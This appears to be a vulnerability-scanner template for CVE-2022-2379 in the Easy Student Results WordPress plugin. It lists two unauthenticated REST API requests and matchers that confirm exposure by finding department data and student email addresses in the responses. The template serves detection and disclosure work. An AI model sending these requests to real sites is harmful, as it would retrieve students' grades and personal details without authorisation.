id: CVE-2022-2379

info:
  name: Easy Student Results <= 2.2.8 - Sensitive Information Disclosure via REST API
  author: theamanrawat
  severity: high
  description: |
    The Easy Student Results WordPress plugin through 2.2.8 lacks authorisation in its REST API, allowing unauthenticated users to retrieve information related to the courses, exams, departments as well as student's grades and PII such as email address, physical address, phone number etc.
  reference:
    - https://wpscan.com/vulnerability/0773ba24-212e-41d5-9ae0-1416ea2c9db6
    - https://wordpress.org/plugins/easy-student-results/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-2379
  tags: cve,cve2022,information-disclosure,wpscan,wordpress,wp-plugin,wp,easy-student-results,unauth

requests:
  - raw:
      - |
        GET /wp-json/rps_result/v1/route/student_fields HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /wp-json/rps_result/v1/route/search_student?department_id=1&batch_id=1 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: word
        part: body
        words:
          - '{"departments":'
          - 'batches":'
        condition: and

      - type: word
        part: body_2
        words:
          - 'meta_data'
          - '"email":"'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200